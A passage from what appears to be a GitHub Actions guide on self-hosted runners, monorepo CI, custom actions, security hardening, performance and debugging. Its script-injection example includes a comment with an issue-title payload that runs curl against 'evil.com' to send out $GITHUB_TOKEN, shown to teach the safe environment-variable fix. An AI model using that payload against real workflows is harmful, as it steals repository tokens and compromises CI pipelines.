githubConfigUrl: "https://github.com/my-org"
githubConfigSecret:
  github_app_id: "12345"
  github_app_installation_id: "67890"
  github_app_private_key: |
    -----BEGIN RSA PRIVATE KEY-----
    ...
    -----END RSA PRIVATE KEY-----

maxRunners: 20
minRunners: 2

template:
  spec:
    containers:
      - name: runner
        image: ghcr.io/actions/actions-runner:latest
        resources:
          requests:
            cpu: "2"
            memory: "4Gi"
          limits:
            cpu: "4"
            memory: "8Gi"
        volumeMounts:
          - name: work
            mountPath: /home/runner/_work
    volumes:
      - name: work
        emptyDir: {}
```

```bash
helm install arc \
  --namespace arc-systems \
  --create-namespace \
  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller

helm install arc-runner-set \
  --namespace arc-runners \
  --create-namespace \
  -f values.yml \
  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set
```

### 7.4 Runner Groups and Labels

```yaml
# Use self-hosted runners with specific labels
jobs:
  build:
    runs-on: [self-hosted, linux, x64, gpu]
    steps:
      - run: nvidia-smi  # GPU available
```

Organize runners into groups in your GitHub org settings. Assign groups to specific repos — prevent untrusted repos from running on sensitive runners. A runner that has production network access should not be available to every experimental project in your org.

### 7.5 Security Warning

**Never use self-hosted runners on public repositories.** Anyone can open a PR to a public repo. If that PR triggers a workflow on your self-hosted runner, the PR author can execute arbitrary code on your infrastructure. This is not a theoretical risk — it is actively exploited in the wild.

For public repos, always use GitHub-hosted runners.

### 7.6 Cost Comparison

| Scale | GitHub-Hosted (Linux) | Self-Hosted (AWS) | Notes |
|-------|----------------------|-------------------|-------|
| 10 jobs/day, 5 min each | ~$2.40/month | ~$35/month (t3.medium always-on) | GitHub-hosted wins at low scale |
| 100 jobs/day, 5 min each | ~$24/month | ~$35/month (t3.medium) + ARC overhead | Break-even zone |
| 500 jobs/day, 10 min each | ~$240/month | ~$70/month (c6i.xlarge spot) | Self-hosted wins at scale |
| 2000 jobs/day, 10 min each | ~$960/month | ~$200/month (ARC on EKS, spot) | Self-hosted is 5x cheaper |

**The crossover point** is roughly 50-100 concurrent runner-minutes per day. Below that, GitHub-hosted is simpler and cheaper. Above that, self-hosted pays for itself. And if your builds need persistent Docker layer caches or pre-warmed dependency installations, the speed improvement often justifies the switch even before the cost crossover.

---

## 8. MONOREPO CI PATTERNS

### 8.1 The Challenge: Running Everything When You Changed Nothing Relevant

In a monorepo with `apps/web`, `apps/api`, `packages/shared`, and `packages/ui`, a naively configured CI runs everything on every PR. The frontend engineer who fixed a typo in a button label waits eight minutes for the entire backend integration test suite. The backend engineer who added a database index watches the Playwright E2E tests grind through 200 UI scenarios.

This is not just slow — it erodes trust in CI. When CI takes 12 minutes and half of that is testing code you did not touch, engineers start ignoring CI results. They merge without waiting. They cherry-pick test runs. The pipeline that was supposed to be the safety net becomes the obstacle that people route around.

The monorepo CI patterns in this section are specifically designed to prevent that. As Ch 15 §3 establishes, a well-organized codebase structure is prerequisite to a well-organized CI system.

### 8.2 Path Filtering (Native)

The simplest approach — separate workflows per area, each with explicit path filters:

```yaml
# .github/workflows/api-ci.yml
name: API CI
on:
  pull_request:
    paths:
      - 'apps/api/**'
      - 'packages/shared/**'
      - 'packages/database/**'
      - '.github/workflows/api-ci.yml'
```

```yaml
# .github/workflows/web-ci.yml
name: Web CI
on:
  pull_request:
    paths:
      - 'apps/web/**'
      - 'packages/shared/**'
      - 'packages/ui/**'
      - '.github/workflows/web-ci.yml'
```

**Limitation:** Path filtering is static. If `packages/shared` changes, both workflows run — even if the change only affects API consumers. For smarter detection, you need a change detection tool.

### 8.3 Change Detection with dorny/paths-filter

```yaml
name: CI

on:
  pull_request:
    branches: [main]

jobs:
  detect-changes:
    runs-on: ubuntu-latest
    outputs:
      api: ${{ steps.filter.outputs.api }}
      web: ${{ steps.filter.outputs.web }}
      shared: ${{ steps.filter.outputs.shared }}
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            api:
              - 'apps/api/**'
              - 'packages/database/**'
            web:
              - 'apps/web/**'
              - 'packages/ui/**'
            shared:
              - 'packages/shared/**'

  api-tests:
    needs: detect-changes
    if: needs.detect-changes.outputs.api == 'true' || needs.detect-changes.outputs.shared == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm test --workspace=apps/api

  web-tests:
    needs: detect-changes
    if: needs.detect-changes.outputs.web == 'true' || needs.detect-changes.outputs.shared == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm test --workspace=apps/web
```

Now a change to `packages/shared` runs both, but a change to only `apps/web` skips API tests entirely. The CSS typo fix gets a 90-second CI run instead of an 8-minute one.

### 8.4 Turborepo Integration

Turborepo has built-in affected package detection that goes a layer deeper than file paths — it understands the dependency graph of your packages.

```yaml
name: CI

on:
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # Needed for comparison

      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: 'npm'

      - run: npm ci

      - name: Run affected tests
        run: npx turbo run test --filter='...[origin/main...HEAD]'
        # Only runs test for packages that changed since main
```

The `--filter='...[origin/main...HEAD]'` syntax tells Turborepo to only run tasks for packages that changed (and their dependents) compared to the main branch. If `packages/shared` changed and `apps/api` depends on it, both get tested — automatically, without you having to hardcode that relationship in your workflow.

### 8.5 Nx Affected

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - uses: nrwl/nx-set-shas@v4
        # Sets NX_BASE and NX_HEAD env vars

      - run: npm ci

      - run: npx nx affected -t test --parallel=3
      - run: npx nx affected -t lint --parallel=3
      - run: npx nx affected -t build --parallel=3
```

### 8.6 Shared Setup with Composite Actions

Avoid repeating setup across monorepo workflows. Every job that runs in your monorepo needs roughly the same boot sequence — checkout, Node setup, npm install, cache config. Extract that into a composite action:

```yaml
# .github/actions/monorepo-setup/action.yml
name: 'Monorepo Setup'
description: 'Standard setup for all monorepo CI jobs'

inputs:
  node_version:
    default: '22'
  turbo_token:
    description: 'Turborepo remote cache token'
    required: false

runs:
  using: 'composite'
  steps:
    - uses: actions/checkout@v4
      with:
        fetch-depth: 0

    - uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node_version }}
        cache: 'npm'

    - name: Turbo cache
      uses: actions/cache@v4
      with:
        path: .turbo
        key: turbo-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}-${{ github.sha }}
        restore-keys: |
          turbo-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}-
          turbo-${{ runner.os }}-

    - shell: bash
      run: npm ci

    - name: Configure Turbo remote cache
      if: inputs.turbo_token != ''
      shell: bash
      env:
        TURBO_TOKEN: ${{ inputs.turbo_token }}
        TURBO_TEAM: ${{ github.repository_owner }}
      run: echo "Turbo remote cache configured"
```

Every workflow in the monorepo starts with:

```yaml
steps:
  - uses: ./.github/actions/monorepo-setup
    with:
      turbo_token: ${{ secrets.TURBO_TOKEN }}
```

One setup. Every workflow. Update it once, and every workflow gets the update.

---

## 9. BUILDING CUSTOM ACTIONS

### 9.1 When to Build Custom

The marketplace has thousands of actions. Before building your own, search it. But build a custom action when:
- You repeat the same multi-step logic across many workflows.
- You need to interact with the GitHub API in a specific way.
- No existing marketplace action does what you need.
- You want to encapsulate domain-specific logic (e.g., "post test results as PR comment with specific formatting").

A good custom action is invisible infrastructure. Engineers in your org use it without knowing it exists, and their pull requests automatically get rich, formatted test result comments. That is the goal.

### 9.2 JavaScript Actions

JavaScript actions run directly in the Node.js runtime on the runner. They are the fastest to start (no Docker pull) and the easiest to develop and test.

```
my-action/
  action.yml
  index.js
  package.json
  node_modules/   # Must be committed (or use ncc to bundle)
```

**action.yml:**

```yaml
name: 'Post Test Results'
description: 'Posts test results as a PR comment with pass/fail summary'
inputs:
  test_results_path:
    description: 'Path to test results JSON'
    required: true
  github_token:
    description: 'GitHub token for posting comments'
    required: true
runs:
  using: 'node20'
  main: 'dist/index.js'
```

**index.js (using @actions/core and @actions/github):**

```javascript
const core = require('@actions/core');
const github = require('@actions/github');
const fs = require('fs');

async function run() {
  try {
    const resultsPath = core.getInput('test_results_path', { required: true });
    const token = core.getInput('github_token', { required: true });

    // Read test results
    const results = JSON.parse(fs.readFileSync(resultsPath, 'utf8'));

    // Format the comment
    const passed = results.numPassedTests;
    const failed = results.numFailedTests;
    const total = results.numTotalTests;
    const duration = (results.testResults
      .reduce((acc, r) => acc + r.perfStats.runtime, 0) / 1000).toFixed(1);

    const status = failed > 0 ? '❌' : '✅';
    const body = [
      `## ${status} Test Results`,
      '',
      `| Metric | Value |`,
      `|--------|-------|`,
      `| Passed | ${passed} |`,
      `| Failed | ${failed} |`,
      `| Total  | ${total} |`,
      `| Duration | ${duration}s |`,
      '',
      failed > 0 ? '### Failed Tests' : '',
      ...results.testResults
        .filter(r => r.status === 'failed')
        .map(r => `- \`${r.name}\`: ${r.message}`),
    ].join('\n');

    // Post as PR comment
    const octokit = github.getOctokit(token);
    const { context } = github;

    if (context.payload.pull_request) {
      await octokit.rest.issues.createComment({
        owner: context.repo.owner,
        repo: context.repo.repo,
        issue_number: context.payload.pull_request.number,
        body,
      });
      core.info(`Posted test results to PR #${context.payload.pull_request.number}`);
    }

    // Set outputs
    core.setOutput('passed', passed);
    core.setOutput('failed', failed);

    // Fail the action if tests failed
    if (failed > 0) {
      core.setFailed(`${failed} test(s) failed`);
    }
  } catch (error) {
    core.setFailed(`Action failed: ${error.message}`);
  }
}

run();
```

**Bundle with ncc** to avoid committing `node_modules`:

```bash
npm install -D @vercel/ncc
npx ncc build index.js -o dist
# Commit dist/index.js instead of node_modules/
```

### 9.3 Docker Container Actions

When you need tools not available in Node.js, or want a fully isolated environment:

```yaml
# action.yml
name: 'Security Scan'
description: 'Run security scan with custom tooling'
inputs:
  scan_path:
    description: 'Path to scan'
    default: '.'
runs:
  using: 'docker'
  image: 'Dockerfile'
  args:
    - ${{ inputs.scan_path }}
```

```dockerfile
FROM python:3.12-slim
RUN pip install bandit safety
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```

```bash
#!/bin/bash
# entrypoint.sh
SCAN_PATH="${1:-.}"
echo "::group::Running Bandit security scan"
bandit -r "$SCAN_PATH" -f json -o /tmp/bandit.json || true
echo "::endgroup::"

# Parse results and set output
ISSUES=$(jq '.results | length' /tmp/bandit.json)
echo "issues=$ISSUES" >> "$GITHUB_OUTPUT"

if [ "$ISSUES" -gt 0 ]; then
  echo "::warning::Found $ISSUES security issues"
  jq -r '.results[] | "::warning file=\(.filename),line=\(.line_number)::\(.issue_text)"' /tmp/bandit.json
fi
```

Docker actions are slower to start (image build/pull) but give you complete control over the runtime.

### 9.4 Testing Custom Actions Locally

Use **act** to test actions locally without pushing to GitHub:

```bash
# Install act
brew install act

# Run a specific workflow
act pull_request -W .github/workflows/ci.yml

# Run a specific job
act -j test

# Pass secrets
act -s GITHUB_TOKEN="$(gh auth token)"

# Use a specific runner image
act -P ubuntu-latest=catthehacker/ubuntu:act-latest
```

**Caveat:** `act` cannot perfectly replicate GitHub-hosted runners. Service containers, OIDC, and some API calls will not work. Use it for fast iteration on workflow logic, not as a replacement for real CI runs. The feedback loop is: `act` for syntax and logic, real GitHub runs for final validation.

### 9.5 Versioning Actions

**For consumers:** Pin by full SHA for security, or by major version tag for convenience:

```yaml
# Most secure: pin by SHA
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683

# Convenient: pin by major version tag
- uses: actions/checkout@v4

# Dangerous: pin by branch (can change at any time)
- uses: actions/checkout@main  # Don't do this
```

**For maintainers:** Follow semantic versioning. Update the major version tag on each release:

```bash
# Release v2.3.0
git tag v2.3.0
git push origin v2.3.0

# Move the v2 floating tag
git tag -d v2
git push origin :refs/tags/v2
git tag v2
git push origin v2
```

---

## 10. SECURITY HARDENING

### 10.1 The Supply Chain Attack Surface

Your CI pipeline is a program. It downloads code from the internet and executes it with access to your production credentials. Stop and sit with that for a moment.

Every `uses: some-action@v3` is a dependency. If that action is compromised — whether through a hacked maintainer account, a typosquatted name, or a malicious update — it runs with everything your workflow can access. In 2023, several popular GitHub Actions were compromised through exactly this vector. The attack surface is real.

### 10.2 Pin Actions by SHA

Tags are mutable. Anyone with push access to a repo can move a tag to point at malicious code. If you use `actions/checkout@v4` and the `actions` org is compromised, your workflow runs the attacker's code.

Pin by full SHA:

```yaml
steps:
  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
  - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af  # v4.1.0
  - uses: actions/cache@1bd1e32a3bdc45362d1e726936510720a7c30a57    # v4.2.0
```

**Always add a comment with the version** so humans can read it. Dependabot and Renovate can auto-update SHA pins — you get security without the maintenance burden of manually tracking versions.

### 10.3 Dependabot for Action Updates

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    commit-message:
      prefix: "ci"
    labels:
      - "dependencies"
      - "ci"
```

Dependabot will open PRs when action versions update, including SHA pin updates. You stay current without watching every action repo you depend on.

### 10.4 CODEOWNERS for CI Files

Prevent unauthorized changes to workflow files. Your CI configuration is infrastructure — it should require the same review rigor as your Terraform or Kubernetes manifests.

```
# .github/CODEOWNERS
.github/workflows/    @org/platform-team
.github/actions/      @org/platform-team
.github/dependabot.yml @org/platform-team
```

Require CODEOWNERS approval in branch protection rules. Now nobody can modify CI without platform team review. An engineer who wants to "just add a quick echo" to a deploy workflow cannot do it without a sign-off from someone who understands what they are changing.

### 10.5 Minimal GITHUB_TOKEN Permissions

Start with zero and add what you need:

```yaml
# Top level: no permissions by default
permissions: {}

jobs:
  test:
    permissions:
      contents: read
    # ...

  deploy:
    permissions:
      contents: read
      id-token: write   # OIDC
    # ...

  comment:
    permissions:
      pull-requests: write
    # ...
```

### 10.6 Environment Protection Rules

For production deployments, configure GitHub Environments. This is where you enforce the human gate in an otherwise automated pipeline:

1. **Required reviewers:** 1-6 people must approve before the job runs.
2. **Wait timer:** Configurable delay (e.g., 5 minutes) before deployment starts.
3. **Branch restrictions:** Only `main` (or `release/*`) can deploy to production.
4. **Environment-specific secrets:** Production secrets are only available to production-environment jobs.

```yaml
jobs:
  deploy-staging:
    environment: staging
    runs-on: ubuntu-latest
    steps:
      - run: deploy --env staging

  deploy-production:
    needs: deploy-staging
    environment:
      name: production
      url: https://app.example.com
    runs-on: ubuntu-latest
    steps:
      - run: deploy --env production
```

### 10.7 Supply Chain Attack Vectors

Understand exactly what you are defending against:

| Attack Vector | Risk | Mitigation |
|--------------|------|------------|
| Compromised action tag | Attacker moves tag to malicious code | Pin by SHA |
| Typosquatting | `actions/checkout` vs `action/checkout` | Review action sources carefully |
| Dependency confusion | Action pulls malicious npm package | Use lockfiles, verify checksums |
| Fork PR injection | PR from fork runs code on your runner | Use `pull_request` (not `pull_request_target`) for untrusted code |
| Secrets exfiltration | Workflow leaks secrets to logs or external URLs | Mask secrets, audit workflow changes |
| Script injection | `${{ github.event.issue.title }}` in `run:` | Never interpolate user input into `run:`, use env vars instead |

**Script injection is the most common vulnerability**, and the most preventable:

```yaml
# VULNERABLE: user-controlled input directly in run command
- run: echo "Issue title: ${{ github.event.issue.title }}"
  # An attacker can set the title to: " && curl evil.com/steal?token=$GITHUB_TOKEN

# SAFE: use environment variables
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "Issue title: $TITLE"
  # Shell variable expansion prevents injection
```

The rule is absolute: never interpolate `github.event.*` or any other user-supplied data directly into a `run:` command. Always pass through an environment variable.

### 10.8 OpenSSF Scorecard and StepSecurity

**Scorecard** audits your repo's security posture against a set of best practices — pinned actions, code review requirements, vulnerability scanning, and more:

```yaml
- uses: ossf/scorecard-action@v2
  with:
    results_file: results.sarif
    results_format: sarif
- uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: results.sarif
```

**StepSecurity Harden-Runner** monitors network and file access during workflow execution, catching unexpected outbound connections before they become incidents:

```yaml
steps:
  - uses: step-security/harden-runner@v2
    with:
      egress-policy: audit  # Start with audit, then move to block
      allowed-endpoints: >
        api.github.com:443
        registry.npmjs.org:443
        nodejs.org:443

  - uses: actions/checkout@v4
  - run: npm ci
  - run: npm test
```

In `block` mode, any network request to a non-allowlisted endpoint fails immediately. This prevents exfiltration of secrets — the single most valuable thing an attacker gets from a compromised workflow.

---

## 11. PERFORMANCE OPTIMIZATION

### 11.1 The Feedback Loop Is the Product

Your CI pipeline is not just a correctness gate. It is the feedback mechanism that tells engineers whether their code is right. A pipeline that takes 15 minutes is a pipeline that engineers stop reading. They multitask while they wait. They lose context. They merge and hope.

A pipeline that takes 3 minutes is one that engineers actually watch. They see the failure, understand it immediately, fix it without losing their train of thought, and push again. The quality of their code goes up. Their velocity goes up. The pipeline pays for itself.

Every minute you shave off CI is a real productivity win, compounded across your entire team, every working day.

### 11.2 Caching Strategies

Caching is the highest-impact optimization. A typical `npm ci` takes 30-90 seconds. A cache hit reduces it to 2-5 seconds.

**Built-in caching with setup-node:**

```yaml
- uses: actions/setup-node@v4
  with:
    node-version: 22
    cache: 'npm'  # Also supports 'yarn', 'pnpm'
```

This caches the npm global cache directory. `npm ci` still runs (to create `node_modules`), but it reads from local cache instead of the network.

**Explicit caching with actions/cache:**

```yaml
- uses: actions/cache@v4
  id: npm-cache
  with:
    path: node_modules
    key: node-modules-${{ runner.os }}-${{ hashFiles('package-lock.json') }}
    restore-keys: |
      node-modules-${{ runner.os }}-

- name: Install dependencies
  if: steps.npm-cache.outputs.cache-hit != 'true'
  run: npm ci
```

This caches `node_modules` directly — skipping `npm ci` entirely on cache hit. Faster, but requires discipline around lockfile hygiene (if the lockfile hash changes, the cache invalidates correctly; if it doesn't change but deps changed somehow, you get a stale cache).

**Docker layer caching:**

```yaml
- uses: docker/build-push-action@v6
  with:
    context: .
    push: true
    tags: myapp:latest
    cache-from: type=gha
    cache-to: type=gha,mode=max
```

The `type=gha` cache backend uses GitHub Actions' cache infrastructure. `mode=max` caches all layers, not just the final image. For a Dockerfile with many layers, this turns a 4-minute image build into a 20-second one on cache hit.

**Cache limits:**
- Each repo has 10 GB of cache storage.
- Caches not accessed in 7 days are evicted.
- When the limit is reached, oldest caches are evicted first.

### 11.3 Artifact Management

Pass data between jobs (which run on different runners):

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build

      - uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/
          retention-days: 1    # Don't waste storage

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: build-output
          path: dist/

      - run: deploy ./dist
```

**Key points:**
- Artifacts are uploaded/downloaded via GitHub's API. Large artifacts are slow.
- Set `retention-days` to the minimum needed. Default is 90 days.
- For large artifacts (>500MB), consider using a cache key instead.
- Artifacts v4 (`upload-artifact@v4`) supports immutable artifacts and concurrent uploads.

### 11.4 Concurrency Groups

Prevent redundant runs when pushing rapidly. This is a small change with a surprisingly large impact on cost:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

If you push to a PR branch three times in quick succession, only the latest push runs. The first two are cancelled. For a team that pushes frequently, this alone can cut runner minutes by 30-40%.

**Per-environment concurrency** (prevent concurrent deploys):

```yaml
concurrency:
  group: deploy-production
  cancel-in-progress: false  # Don't cancel in-progress deploys
```

You never want two simultaneous deploys to production. This ensures they queue instead of racing.

### 11.5 Reducing Checkout Overhead

The default `actions/checkout` clones the full repo history. For large repos with years of commits, this is measurably slow.

```yaml
# Shallow clone (latest commit only)
- uses: actions/checkout@v4
  with:
    fetch-depth: 1    # Default is 1, but explicit is clear

# Sparse checkout (only specific directories)
- uses: actions/checkout@v4
  with:
    sparse-checkout: |
      apps/api
      packages/shared
    sparse-checkout-cone-mode: true
```

**Sparse checkout** is powerful for large monorepos. If you only need `apps/api` and `packages/shared`, why clone `apps/web`, `apps/mobile`, and 50 other directories? Each unnecessary directory is bandwidth spent and time wasted on every single CI run.

### 11.6 Timeouts

Always set timeouts. A hung test — waiting for a port that never opened, a database connection that timed out silently, a mock server that crashed — can burn runner minutes for 6 hours (the default GitHub timeout):

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15    # Kill if not done in 15 minutes
    steps:
      - run: npm test
        timeout-minutes: 10  # Step-level timeout
```

Set your timeout to 2x your expected runtime. If tests normally take 5 minutes, set 10. The goal is to catch hangs without cutting off legitimate slow runs.

### 11.7 Larger Runners

GitHub offers larger runners for teams and enterprise:

| Runner | vCPUs | RAM | Storage | Price/min |
|--------|-------|-----|---------|-----------|
| ubuntu-latest | 4 | 16 GB | 14 GB SSD | $0.008 |
| ubuntu-latest-4-cores | 4 | 16 GB | 150 GB SSD | $0.016 |
| ubuntu-latest-8-cores | 8 | 32 GB | 300 GB SSD | $0.032 |
| ubuntu-latest-16-cores | 16 | 64 GB | 600 GB SSD | $0.064 |
| ubuntu-latest-32-cores | 32 | 128 GB | 2 TB SSD | $0.128 |
| ubuntu-latest-64-cores | 64 | 256 GB | 2 TB SSD | $0.256 |

A build that takes 20 minutes on a 4-core runner might take 6 minutes on a 16-core runner. At $0.064/min, the 16-core run costs $0.38 vs $0.16 on 4-core — but you get results 14 minutes sooner. For PR feedback loops, the time savings vastly outweigh the cost difference. Engineer time is expensive; runner minutes are cheap.

### 11.8 Measuring CI Performance

You cannot improve what you do not measure. Use the GitHub CLI to track workflow run durations over time:

```bash
# List recent workflow runs with duration
gh run list --workflow ci.yml --limit 20 --json databaseId,conclusion,createdAt,updatedAt \
  | jq '.[] | {id: .databaseId, conclusion: .conclusion,
    duration_seconds: (((.updatedAt | fromdateiso8601) - (.createdAt | fromdateiso8601)))} '

# Average duration of successful runs in the last 7 days
gh run list --workflow ci.yml --limit 50 --status success \
  --json createdAt,updatedAt \
  | jq '[.[] | ((.updatedAt | fromdateiso8601) - (.createdAt | fromdateiso8601))] | add / length | . / 60 | round'
# Outputs average minutes
```

Track this metric weekly. If CI duration trends upward, investigate before it becomes a team-wide bottleneck. CI duration is a leading indicator of developer velocity — when it degrades, everything else degrades with it.

---

## 12. ADVANCED PATTERNS

### 12.1 Deployment Environments with Protection Rules

The deploy-to-staging-first, gate-on-production pattern is how mature teams ship with confidence. Every merge triggers an automatic staging deployment. Production requires a human decision.

```yaml
name: Deploy

on:
  push:
    branches: [main]

jobs:
  deploy-staging:
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.example.com
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/staging-deploy
          aws-region: us-east-1
      - run: ./scripts/deploy.sh staging

  integration-tests:
    needs: deploy-staging
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm run test:integration -- --base-url=https://staging.example.com

  deploy-production:
    needs: integration-tests
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://app.example.com
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/production-deploy
          aws-region: us-east-1
      - run: ./scripts/deploy.sh production
```

The `production` environment has required reviewers configured in GitHub. The workflow pauses at `deploy-production` until someone approves. Merging to main is boring. Production deployments are deliberate. That is the goal.

### 12.2 Workflow Dispatch with Custom Inputs

Deploy any branch to any environment, on demand — the escape hatch that teams need for hotfixes and emergency rollbacks:

```yaml
name: Manual Deploy

on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Target environment'
        required: true
        type: choice
        options:
          - staging
          - production
      ref:
        description: 'Branch or tag to deploy'
        required: true
        default: 'main'
      skip_tests:
        description: 'Skip pre-deploy tests'
        type: boolean
        default: false

jobs:
  validate:
    if: inputs.skip_tests == false
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ inputs.ref }}
      - run: npm ci && npm test

  deploy:
    needs: validate
    if: always() && (needs.validate.result == 'success' || inputs.skip_tests)
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ inputs.ref }}
      - run: ./scripts/deploy.sh ${{ inputs.environment }}
```

### 12.3 Scheduled Workflows

Not everything should be triggered by code changes. Weekly dependency audits, stale branch cleanup, and synthetic monitoring are all good candidates for scheduled workflows.

```yaml
name: Maintenance

on:
  schedule:
    - cron: '0 9 * * 1'  # Monday 9 AM UTC

jobs:
  dependency-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm audit --production
      - name: Check for critical vulnerabilities
        run: |
          CRITICAL=$(npm audit --json 2>/dev/null | jq '.metadata.vulnerabilities.critical // 0')
          if [ "$CRITICAL" -gt 0 ]; then
            echo "::error::Found $CRITICAL critical vulnerabilities"
            exit 1
          fi

  stale-branches:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Find stale branches
        run: |
          echo "## Branches with no commits in 30+ days" >> "$GITHUB_STEP_SUMMARY"
          echo "" >> "$GITHUB_STEP_SUMMARY"
          git for-each-ref --sort=committerdate refs/remotes/origin \
            --format='%(committerdate:short) %(refname:short)' \
            | while read date branch; do
                if [[ "$(date -d "$date" +%s 2>/dev/null || date -jf '%Y-%m-%d' "$date" +%s)" -lt "$(date -d '30 days ago' +%s 2>/dev/null || date -v-30d +%s)" ]]; then
                  echo "- \`$branch\` (last commit: $date)" >> "$GITHUB_STEP_SUMMARY"
                fi
              done
```

**Caveat:** Scheduled workflows run on the default branch only. If the workflow file is not on the default branch, the schedule will not trigger.

### 12.4 Repository Dispatch (Cross-Repo Triggering)

In a microservices architecture, you sometimes need one repo's CI to trigger another's tests. Repository dispatch is the mechanism for that.

**Sender (in repo A):**

```yaml
- name: Trigger integration tests in repo B
  uses: peter-evans/repository-dispatch@v3
  with:
    token: ${{ secrets.PAT_TOKEN }}  # Needs repo scope
    repository: org/repo-b
    event-type: run-integration-tests
    client-payload: '{"ref": "${{ github.sha }}", "service": "api"}'
```

**Receiver (in repo B):**

```yaml
on:
  repository_dispatch:
    types: [run-integration-tests]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: |
          echo "Triggered by: ${{ github.event.client_payload.service }}"
          echo "Source ref: ${{ github.event.client_payload.ref }}"
          npm run test:integration
```

### 12.5 PR Labeling and Auto-Merge

Automate the mechanical parts of PR management so humans can focus on the substantive parts:

```yaml
name: PR Automation

on:
  pull_request:
    types: [opened, synchronize, labeled]

jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write
    steps:
      - uses: actions/labeler@v5
        with:
          repo-token: ${{ secrets.GITHUB_TOKEN }}
          # Labels based on .github/labeler.yml path rules

  auto-merge-dependabot:
    if: github.actor == 'dependabot[bot]'
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write
    steps:
      - uses: dependabot/fetch-metadata@v2
        id: metadata
      - if: steps.metadata.outputs.update-type == 'version-update:semver-patch'
        run: gh pr merge --auto --squash "$PR_URL"
        env:
          PR_URL: ${{ github.event.pull_request.html_url }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

Patch-version Dependabot PRs auto-merge after CI passes. You never manually merge a `lodash 4.17.21 → 4.17.22` PR again.

### 12.6 Job Summaries

Write rich Markdown summaries visible in the workflow run UI. This is the difference between a CI result that tells you "failed" and one that tells you exactly what failed and how bad it is:

```yaml
- name: Generate test summary
  if: always()
  run: |
    echo "## Test Results" >> "$GITHUB_STEP_SUMMARY"
    echo "" >> "$GITHUB_STEP_SUMMARY"
    echo "| Suite | Passed | Failed | Duration |" >> "$GITHUB_STEP_SUMMARY"
    echo "|-------|--------|--------|----------|" >> "$GITHUB_STEP_SUMMARY"
    echo "| Unit  | 142    | 0      | 23s      |" >> "$GITHUB_STEP_SUMMARY"
    echo "| Integration | 38 | 1   | 1m 45s   |" >> "$GITHUB_STEP_SUMMARY"
    echo "" >> "$GITHUB_STEP_SUMMARY"
    echo "### Coverage: 87.3%" >> "$GITHUB_STEP_SUMMARY"
```

Engineers should not have to hunt through 800 lines of logs to understand why CI failed. Job summaries bring the important information to the surface.

---

## 13. DEBUGGING AND TROUBLESHOOTING

### 13.1 Debug Logging

Enable verbose logging by setting repository secrets:

| Secret | Effect |
|--------|--------|
| `ACTIONS_STEP_DEBUG` = `true` | Verbose step output (each action's debug logs) |
| `ACTIONS_RUNNER_DEBUG` = `true` | Runner-level debug info (environment, paths, etc.) |

You can also re-run a specific failed job with debug logging enabled from the GitHub UI (Re-run jobs → Enable debug logging). This is the fastest path from "CI failed mysteriously" to "I know exactly what happened."

### 13.2 Local Testing with act

```bash
# Install
brew install act                              # macOS
curl -s https://raw.githubusercontent.com/nektos/act/master/install.sh | sudo bash  # Linux

# Run the default event (push)
act

# Run pull_request event
act pull_request

# Run a specific job
act -j test

# List all jobs without running them
act -l

# Use secrets from a file
act --secret-file .env.ci

# Use a specific platform image (default is slim, may be missing tools)
act -P ubuntu-latest=catthehacker/ubuntu:full-latest
```

**Limitations of act:**
- No service containers (Postgres, Redis) — use `docker-compose` alongside.
- No OIDC tokens.
- No GitHub API features (pull_request context is mocked).
